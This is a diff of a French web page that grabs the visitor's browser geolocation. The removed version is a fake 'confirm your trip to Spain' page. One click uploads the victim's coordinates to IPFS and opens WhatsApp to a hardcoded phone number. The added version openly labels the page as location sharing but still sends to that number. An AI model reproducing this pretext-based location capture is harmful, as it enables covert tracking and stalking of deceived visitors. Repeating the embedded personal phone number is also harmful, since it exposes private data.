@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Confirmation de votre voyage en Espagne</title>
-    <script src="https://cdn.jsdelivr.net/npm/ipfs-http-client@50.1.2/dist/index.min.js"></script>
+    <title>Partage de localisation</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,7 +13,6 @@
             height: 100vh;
             background: linear-gradient(45deg, #ff7e5f, #feb47b);
             margin: 0;
-            animation: backgroundAnimation 5s infinite alternate;
         }
         .container {
             text-align: center;
@@ -23,87 +21,83 @@
             border-radius: 15px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             width: 80%;
-            max-width: 500px;
-            position: relative;
-            animation: zoomIn 1s ease-out;
+            max-width: 400px;
         }
         h1 {
-            font-size: 2.5em;
+            font-size: 1.8em;
             color: #333;
             margin-bottom: 15px;
-            animation: fadeIn 2s ease-in-out;
         }
         button {
-            background-color: #25d366; 
+            background-color: #25d366; /* Vert WhatsApp */
             color: white;
-            padding: 15px 25px;
+            padding: 12px 20px;
             border: none;
             border-radius: 5px;
             font-size: 18px;
             cursor: pointer;
-            transition: transform 0.3s ease-in-out;
+            margin: 10px;
         }
         button:hover {
-            transform: scale(1.1);
+            background-color: #1ebd5d;
         }
-        @keyframes backgroundAnimation {
-            0% { background: linear-gradient(45deg, #ff7e5f, #feb47b); }
-            100% { background: linear-gradient(45deg, #feb47b, #ff7e5f); }
+        #copyLink {
+            background-color: #007aff; /* Bleu Snapchat */
+        }
+        #copyLink:hover {
+            background-color: #0066cc;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Bon voyage en Espagne 🇪🇸 !</h1>
-    <p>Confirmez votre voyage en un seul clic !</p>
-    <button id="sendLocationButton">Confirmé</button>
+    <h1>Partager ma position 📍</h1>
+    <p>Envoyez votre position actuelle sur WhatsApp ou Snap.</p>
+    <button id="sendWhatsApp">Envoyer sur WhatsApp</button>
+    <button id="copyLink">Copier le lien pour Snapchat</button>
+    <p id="link" style="margin-top: 15px; word-wrap: break-word;"></p>
 </div>
 
 <script>
-    document.getElementById('sendLocationButton').addEventListener('click', async function() {
-        try {
-            console.log("Bouton cliqué, récupération de la géolocalisation...");
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async position => {
-                    let lat = position.coords.latitude;
-                    let lon = position.coords.longitude;
-                    let timestamp = new Date().toISOString();
-                    let data = JSON.stringify({ latitude: lat, longitude: lon, timestamp });
+    document.getElementById('sendWhatsApp').addEventListener('click', function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                let lat = position.coords.latitude;
+                let lon = position.coords.longitude;
+                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                let message = `📍 Voici ma position actuelle : ${mapLink}`;
+                let whatsappUrl = `https://wa.me/33605993097?text=${encodeURIComponent(message)}`;
 
-                    console.log("Position récupérée : ", data);
+                window.open(whatsappUrl, '_blank'); // Ouvre WhatsApp
+            }, () => {
+                alert("Impossible de récupérer votre position. Activez la localisation.");
+            });
+        } else {
+            alert("Votre navigateur ne supporte pas la géolocalisation.");
+        }
+    });
 
-                    try {
-                        // Connexion à IPFS via Infura
-                        const ipfs = window.IpfsHttpClient.create({ host: 'ipfs.infura.io', port: '5001', protocol: 'https' });
-
-                        // Upload des données sur IPFS
-                        const result = await ipfs.add(data);
-                        let ipfsHash = result.path;
-                        let ipfsLink = `https://ipfs.io/ipfs/${ipfsHash}`;
-
-                        console.log("Données stockées sur IPFS : ", ipfsLink);
-
-                        let message = `Bon voyage ! 🇪🇸 Voici votre itinéraire sécurisé : ${ipfsLink}`;
-                        let whatsappUrl = `https://wa.me/33605993097?text=${encodeURIComponent(message)}`;
-
-                        // Ouvrir WhatsApp immédiatement après l'upload sur IPFS
-                        window.open(whatsappUrl, '_blank');
-
-                        alert("Données envoyées via WhatsApp !");
-                    } catch (error) {
-                        console.error("Erreur lors de l'upload sur IPFS :", error);
-                        alert("Erreur de stockage IPFS !");
-                    }
-                }, () => {
-                    alert("Impossible de récupérer la position.");
+    document.getElementById('copyLink').addEventListener('click', function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                let lat = position.coords.latitude;
+                let lon = position.coords.longitude;
+                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // Copier automatiquement le lien dans le presse-papier
+                navigator.clipboard.writeText(mapLink).then(() => {
+                    alert("Lien copié ! Collez-le sur Snapchat.");
+                }).catch(err => {
+                    console.error("Erreur lors de la copie :", err);
                 });
-            } else {
-                alert("Votre navigateur ne supporte pas la géolocalisation.");
-            }
-        } catch (err) {
-            console.error("Erreur principale : ", err);
-            alert("Une erreur est survenue !");
+
+                document.getElementById('link').innerText = mapLink; // Afficher le lien
+            }, () => {
+                alert("Impossible de récupérer votre position.");
+            });
+        } else {
+            alert("Votre navigateur ne supporte pas la géolocalisation.");
         }
     });
 </script>
